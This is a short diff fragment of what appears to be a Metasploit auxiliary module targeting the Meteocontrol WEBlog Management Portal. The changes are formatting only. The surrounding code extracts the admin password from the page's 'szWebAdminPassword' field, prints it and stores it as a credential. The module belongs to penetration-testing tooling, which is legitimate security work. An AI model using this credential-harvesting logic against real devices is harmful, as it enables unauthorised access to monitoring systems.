@@ -89,19 +89,18 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if (res and res.code == 200 and res.body.include?("szWebAdminPassword") or res.body=~ /Admin Monitoring/)
-        get_admin_password = res.body.match(/name="szWebAdminPassword" value="(.*?)"/)
-        admin_password = get_admin_password[1]
-        print_good("#{rhost}:#{rport} - Password is #{admin_password}")
-        report_cred(
+      get_admin_password = res.body.match(/name="szWebAdminPassword" value="(.*?)"/)
+      admin_password = get_admin_password[1]
+      print_good("#{rhost}:#{rport} - Password is #{admin_password}")
+      report_cred(
                 ip: rhost,
                 port: rport,
                 service_name: 'Meteocontrol WEBlog Management Portal',
                 password: admin_password,
-                proof: res.body
-      )
+                proof: res.body)
     else
-        # In some models, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Try login manually in such cases.
-        print_error("Password not found. Check login manually.")
+      # In some models, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Try login manually in such cases.
+      print_error("Password not found. Check login manually.")
     end
   end
 
